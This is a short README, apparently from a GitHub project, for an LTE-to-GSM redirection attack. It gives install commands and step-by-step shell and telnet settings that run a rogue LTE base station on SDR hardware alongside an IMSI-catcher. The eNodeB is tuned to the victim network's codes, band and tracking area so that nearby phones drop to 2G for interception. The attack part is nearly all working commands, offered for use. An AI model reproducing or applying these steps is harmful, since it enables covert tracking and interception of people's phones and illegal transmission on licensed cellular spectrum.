#Redirect 4G->2G (Simplified version)

##Install (Working on Ubuntu 20.04.4)

.. code:: bash

   git clone https://github.com/bbaranoff/OpenLTE2GSM
   cd OpenLTE2GSM
   sudo bash install.sh

##Running LTE Redirection Attack Updated with
https://github.com/bbaranoff/openlte2GSM

Redirect attack from long term evolution (LTE 4G) to global system
mobile (GSM 2G): article in progress

Tested with : LimeSDR-Mini + 2 Motorola (C1XX series osmocom-bb
compatibles) or BladeRF-xA4 + 2 Motorola or BladeRF-xA4 + LimeSDR-Mini

Phone in 2G/3G/4G mode This article is in progress and is just a PoC The
attack step are run the IMSI-catcher into arfcn 514 follow (see Build
IMSI-catcher) run the 4G redirector as follow

Shell #1

.. code:: bash

   sudo LTE_fdd_enodeb

Shell #2

.. code:: bash

   telnet localhost 30000
   write rx_gain 30
   write tx_gain 80
   write mcc 215
   write mnc 15
   write band 7
   write dl_earfcn 3350
   write tracking_area_code 6604

(change with your ue values be careful that the earfcn is in the band
you can have tracking_area_code via mobile testing mode *#0011# on
samsung or*\ #\ *#4636#*\ #\* on OnePlus for example)

Shell #2

.. code:: bash

   start

wait… and when you have “ok” answer in shell #2 and … enjoy !
